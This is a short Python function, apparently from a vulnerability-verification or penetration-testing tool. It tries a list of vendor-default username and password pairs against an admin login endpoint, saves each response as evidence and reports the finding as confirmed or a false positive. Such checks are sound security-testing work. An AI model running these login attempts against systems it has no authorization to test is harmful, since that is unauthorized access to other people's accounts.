def check_default_creds(session, hyp, ev_dir, ctx):
    """Default credentials: an admin login accepts a common vendor-default pair."""
    endpoint = hyp["endpoint"]
    files = []
    for user, pw in _DEFAULT_CREDS:
        resp = session.post(endpoint, data={"username": user, "password": pw})
        files += save_evidence(ev_dir, f"try-{user}-{pw}", resp)
        if resp.status == 200 and "ok" in (resp.body or "").lower():
            return CheckResult("confirmed", endpoint, "high", f"{user}:{pw}",
                               f"Admin login accepted default credentials {user}:{pw}.",
                               files=files)
    return CheckResult("false-positive", endpoint, files=files,
                       false_positive_reason="no default credential pair was accepted")
